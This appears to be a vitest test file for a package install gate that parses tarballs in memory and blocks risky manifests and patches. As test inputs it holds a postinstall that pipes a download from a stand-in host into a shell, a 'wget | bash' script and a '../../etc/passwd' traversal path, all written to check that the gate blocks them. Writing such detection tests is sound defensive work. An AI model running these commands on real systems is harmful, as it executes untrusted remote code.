/**
 * 安装门禁：spec 校验、tarball 内存解析、GT 高危规则、三种输出。
 *
 * 全程不联网、不落盘、不删文件。tar.gz 由测试自己按格式拼出来，
 * 这样能精确验证解析器对 `package/` 前缀、文本扩展名、体积上限的处理。
 */
import { gzipSync } from 'node:zlib'
import { describe, expect, it, vi } from 'vitest'
import {
  evaluateGateRules,
  filesFromTarball,
  gateJson,
  gateMarkdownLines,
  gatePlainLines,
  gateSpec,
  parseRegistrySpec,
  untarGzip,
  type GateResult,
} from '../src/plugins/gate'

/**
 * 按 tar 的 512 字节头格式拼一个普通文件成员。
 *
 * 头部关键字段：name[0..99]、size[124..135]（八进制 ASCII）、typeflag[156]。
 * 内容按 512 字节对齐；解析器不校验 checksum，所以这里省略它。
 */
function tarMember(name: string, content: string): Buffer {
  const header = Buffer.alloc(512)
  Buffer.from(name, 'utf8').copy(header, 0, 0, 100)
  // 11 位八进制 + 一个 NUL，正好占满 12 字节的 size 字段。
  Buffer.from(content.length.toString(8).padStart(11, '0') + '\0', 'ascii').copy(header, 124)
  header[156] = '0'.charCodeAt(0)
  const body = Buffer.from(content, 'utf8')
  const padding = Buffer.alloc((512 - (body.length % 512)) % 512)
  return Buffer.concat([header, body, padding])
}

function makeTarGz(files: Record<string, string>): Buffer {
  const members = Object.entries(files).map(([path, text]) => tarMember(path, text))
  // 两个全零块表示归档结束。
  return gzipSync(Buffer.concat([...members, Buffer.alloc(1024)]))
}

describe('parseRegistrySpec', () => {
  it('accepts a bare name, an exact version, and a scoped package', () => {
    expect(parseRegistrySpec('dsh-ops')).toEqual({ name: 'dsh-ops' })
    expect(parseRegistrySpec('dsh-ops@0.5.2')).toEqual({ name: 'dsh-ops', version: '0.5.2' })
    expect(parseRegistrySpec('@deepseek-ai/dsh-base@0.2.1-rc.1')).toEqual({
      name: '@deepseek-ai/dsh-base', version: '0.2.1-rc.1',
    })
  })

  it('accepts a dist-tag but refuses version ranges', () => {
    expect(parseRegistrySpec('dsh-ops@latest')).toEqual({ name: 'dsh-ops', version: 'latest' })
    // 范围表达式会让「审的版本」和 pnpm 实际装的版本可能不同。
    expect(parseRegistrySpec('dsh-ops@^0.5.2')).toBeUndefined()
    expect(parseRegistrySpec('dsh-ops@~0.5')).toBeUndefined()
    expect(parseRegistrySpec('dsh-ops@>=1')).toBeUndefined()
    expect(parseRegistrySpec('dsh-ops@1.x')).toBeUndefined()
  })

  it('refuses git, URL, tarball and local path specs', () => {
    for (const spec of [
      'https://example.com/a.tgz', 'git+https://github.com/a/b.git',
      'github:a/b', 'file:../x', 'link:../x', './local', 'pkg.tgz',
      '/abs/path', '', '   ',
    ]) {
      expect(parseRegistrySpec(spec), spec).toBeUndefined()
    }
  })
})

describe('tarball parsing stays in memory', () => {
  it('reads members without touching the filesystem', () => {
    const buffer = makeTarGz({ 'package/package.json': '{"name":"x"}', 'package/lib/a.js': 'console.log(1)' })
    const entries = untarGzip(buffer)
    expect(entries.map(entry => entry.path)).toEqual(['package/package.json', 'package/lib/a.js'])
    expect(entries[0]!.data.toString('utf8')).toBe('{"name":"x"}')
  })

  it('strips the package/ prefix, skips inner node_modules and binaries', () => {
    const buffer = makeTarGz({
      'package/package.json': '{}',
      'package/cordis.patch.yml': '- insert:\n    - id: tool-a\n',
      'package/lib/index.js': 'eval("x")',
      'package/node_modules/dep/index.js': 'evil()',
      'package/logo.png': 'not text',
      'package/README.md': '# hi',
    })
    const { files } = filesFromTarball(buffer)
    const paths = files.map(file => file.path)
    expect(paths).toContain('package.json')
    expect(paths).toContain('cordis.patch.yml')
    expect(paths).toContain('README.md')
    expect(paths).not.toContain('node_modules/dep/index.js')
    expect(paths).not.toContain('logo.png')
  })

  it('refuses path traversal in member names', () => {
    const buffer = makeTarGz({ 'package/../../etc/passwd': 'secret', 'package/package.json': '{}' })
    expect(filesFromTarball(buffer).files.map(file => file.path)).toEqual(['package.json'])
  })

  it('marks oversized archives and explains it in notes', () => {
    const buffer = makeTarGz({ 'package/lib/huge.js': 'x'.repeat(2 * 1024 * 1024 + 1) })
    const result = filesFromTarball(buffer)
    expect(result.oversized).toBe(true)
    expect(result.files).toHaveLength(0)
  })
})

describe('GT rules only block on structural high-risk signals', () => {
  const clean = () => ({
    manifest: {
      name: 'normal-pkg', version: '1.0.0',
      scripts: { build: 'tsc -p .' },
      dependencies: { yaml: '^2.4.2' },
    },
    patchText: '- insert:\n    - id: tool-normal\n      name: normal-pkg\n',
    files: [],
  })

  it('lets a normal manifest pass', () => {
    expect(evaluateGateRules(clean())).toEqual([])
  })

  it('GT001 blocks download-piped-into-shell install scripts', () => {
    const input = clean()
    input.manifest.scripts = { postinstall: 'curl https://x.example/i.sh | sh' }
    expect(evaluateGateRules(input).map(f => f.id)).toContain('GT001')
  })

  it('GT001 does not fire when curl is only mentioned in a normal build script', () => {
    const input = clean()
    input.manifest.scripts = { build: 'curl --version' }
    expect(evaluateGateRules(input)).toEqual([])
  })

  it('GT002 blocks patches that overwrite official loader entries', () => {
    const input = clean()
    input.patchText = "- id: '@deepseek-ai/dsh-base'\n  config: {}\n"
    expect(evaluateGateRules(input).map(f => f.id)).toContain('GT002')
  })

  it('GT002 blocks silently disabling another plugin entry', () => {
    const input = clean()
    input.patchText = "- id: 'ui-chat'\n  disabled: true\n"
    expect(evaluateGateRules(input).map(f => f.id)).toContain('GT002')
  })

  it('GT002 allows a bundle to disable its own inserted entry', () => {
    const input = clean()
    input.patchText = '- insert://n    - id: tool-normal\n      name: normal-pkg\n      disabled: true\n'
    expect(evaluateGateRules(input)).toEqual([])
  })

  it('GT002 does not confuse new inserts with overwrites', () => {
    const input = clean()
    input.patchText = '- insert:\n    - id: @deepseek-ai/my-own\n      name: mine\n'
    expect(evaluateGateRules(input)).toEqual([])
  })

  it('GT003 blocks runtime dependencies pointing to remote URLs', () => {
    const input = clean()
    input.manifest.dependencies = { helper: 'https://x.example/h.tgz' }
    expect(evaluateGateRules(input).map(f => f.id)).toContain('GT003')
  })

  it('GT003 ignores devDependencies, where local links are normal', () => {
    const input = clean()
    ;(input.manifest as Record<string, unknown>).devDependencies = { local: 'file:../local' }
    expect(evaluateGateRules(input)).toEqual([])
  })

  it('reports each rule at most once and uses error severity', () => {
    const input = clean()
    input.manifest.scripts = { postinstall: 'curl x | sh', prepare: 'wget y | bash' }
    input.manifest.dependencies = { a: 'https://x/a', b: 'git+https://y/b' }
    input.patchText = "- id: '@deepseek-ai/dsh-base'\n  config: {}\n"
    const findings = evaluateGateRules(input)
    expect(findings.map(f => f.id)).toEqual(['GT001', 'GT002', 'GT003'])
    expect(findings.every(f => f.severity === 'error')).toBe(true)
  })
})

describe('gateSpec failure naming', () => {
  it('names a network failure instead of returning UNKNOWN', async () => {
    // fetch 的网络失败抛的是没有 code 的 TypeError。以前这里会退化成
    // `resolve-failed：UNKNOWN`，用户无从判断是网络不通还是包有问题。
    vi.stubGlobal('fetch', async () => { throw new TypeError('fetch failed') })
    try {
      const result = await gateSpec('demo@1.0.0', { registry: 'https://registry.example/' })
      expect(result.decision).toBe('error')
      expect(result.problem).toContain('network-error')
      expect(result.problem).not.toContain('UNKNOWN')
    } finally {
      vi.unstubAllGlobals()
    }
  })

  it('names a missing version from a reachable registry', async () => {
    vi.stubGlobal('fetch', async () => new Response(JSON.stringify({
      versions: { '1.0.0': { dist: { tarball: 'https://registry.example/demo-1.0.0.tgz' } } },
      'dist-tags': { latest: '1.0.0' },
    }), { status: 200, headers: { 'content-type': 'application/json' } }))
    try {
      const result = await gateSpec('demo@2.0.0', { registry: 'https://registry.example/' })
      expect(result.decision).toBe('error')
      expect(result.problem).toContain('version-not-found')
    } finally {
      vi.unstubAllGlobals()
    }
  })

  it('names an http status when the package does not exist', async () => {
    vi.stubGlobal('fetch', async () => new Response('{}', { status: 404 }))
    try {
      const result = await gateSpec('no-such-package', { registry: 'https://registry.example/' })
      expect(result.problem).toContain('http-404')
    } finally {
      vi.unstubAllGlobals()
    }
  })
})

describe('gateSpec registry override', () => {
  it('fails closed on a non-http registry instead of falling back', async () => {
    // 静默回退会重新造出「审 A 装 B」；这里必须明确记成 error。
    const result = await gateSpec('demo@1.0.0', { registry: 'ftp://mirror.internal/' })
    expect(result.decision).toBe('error')
    expect(result.problem).toContain('registry-override-invalid')
    expect(result.problem).not.toContain('mirror.internal')
  })

  it('fails closed on an empty registry', async () => {
    const result = await gateSpec('demo@1.0.0', { registry: '   ' })
    expect(result.decision).toBe('error')
    expect(result.problem).toContain('registry-override-empty')
  })
})

describe('gate output', () => {
  const passed: GateResult = {
    spec: 'demo@1.0.0', name: 'demo', version: '1.0.0', installSpec: 'demo@1.0.0',
    tarball: 'https://registry.example/demo-1.0.0.tgz', registry: 'https://registry.example/',
    decision: 'pass', findings: [],
    review: { pkg: 'demo', dir: '<tarball>', hints: [], focus: [], notes: [] },
    notes: [],
  }
  const blocked: GateResult = {
    ...passed, decision: 'block',
    findings: [{
      id: 'GT001', severity: 'error', title: '安装期脚本会执行远程内容',
      detail: '检查 postinstall。', where: 'package.json',
    }],
  }
  const failed: GateResult = {
    ...passed, decision: 'error', problem: 'download-failed：ETIMEDOUT',
  }

  it('JSON carries the decision, disclaimer and exact install spec', () => {
    const json = gateJson(passed)
    expect(json.decision).toBe('pass')
    expect(json.installSpec).toBe('demo@1.0.0')
    expect(json.disclaimer).toContain('not a malware verdict')
  })

  it('plain text never uses Markdown tables', () => {
    for (const result of [passed, blocked, failed]) {
      expect(gatePlainLines(result).join('\n')).not.toContain('|')
    }
  })

  it('plain text explains fail-closed instead of pretending to pass', () => {
    const text = gatePlainLines(failed).join('\n')
    expect(text).toContain('未能完成审查')
    expect(text).toContain('不安装')
    expect(text).toContain('download-failed')
  })

  it('Markdown shows the blocked rule, the registry and the real coverage boundary', () => {
    const text = gateMarkdownLines(blocked).join('\n')
    expect(text).toContain('GT001')
    expect(text).toContain('拒绝安装')
    // 边界文案必须提到「插件页也覆盖了」以及「哪条路覆盖不了」，
    // 不能像 0.16.0 那样写死「只覆盖 --gate 与 /install」。
    expect(text).toContain('插件页')
    expect(text).toContain('无法覆盖')
    expect(text).toContain('取包来源')
    expect(text).toContain('https://registry.example/')
  })

  it('Markdown warns that pnpm may fall back to another registry', () => {
    const text = gateMarkdownLines(passed).join('\n')
    expect(text).toContain('同源限制')
    expect(text).toContain('回退')
  })

  it('never emits an absolute local path', () => {
    for (const result of [passed, blocked, failed]) {
      const all = JSON.stringify(gateJson(result)) + gatePlainLines(result).join('\n')
      expect(all).not.toMatch(/(?:^|\s)[A-Za-z]:[\\/]/)
      expect(all).not.toMatch(/\/Users\/|\/home\//)
    }
  })
})
